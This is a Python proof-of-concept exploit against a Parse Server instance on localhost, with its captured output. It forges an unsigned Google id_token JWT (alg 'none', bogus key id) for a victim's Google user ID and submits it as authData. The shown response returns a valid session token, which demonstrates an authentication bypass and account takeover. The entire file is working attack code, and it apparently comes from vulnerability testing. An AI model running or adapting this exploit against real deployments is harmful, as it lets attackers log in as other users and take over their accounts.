import requests
import base64

URL = "http://localhost:11337/parse"
APP_ID = "vuln-test-app-id"
GOOGLE_CLIENT_ID = "test-google-client-id.apps.googleusercontent.com"
VICTIM_GOOGLE_ID = "target-google-user-id"

def b64url(data):
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

header = b'{"alg":"none","kid":"nonexistent-key","typ":"JWT"}'
payload = f'{{"sub":"{VICTIM_GOOGLE_ID}","iss":"accounts.google.com","aud":"{GOOGLE_CLIENT_ID}","exp":9999999999}}'

token = f"{b64url(header)}.{b64url(payload.encode())}."

r = requests.post(
    f"{URL}/users",
    headers={
        "X-Parse-Application-Id": APP_ID,
        "Content-Type": "application/json",
    },
    json={
        "authData": {
            "google": {
                "id": VICTIM_GOOGLE_ID,
                "id_token": token
            }
        }
    },
)
print(f"Status: {r.status_code}")
print(f"Response: {r.text}")

'''
Status: 201
Response: {"objectId":"H9L2g8kN8P","createdAt":"2026-02-23T19:41:07.760Z","username":"TU1B0Wp6TajSiJGkhHdS7Ngzz","sessionToken":"r:3b83799a6213e368ae9424baedb9c2bd","authDataResponse":{}}
'''
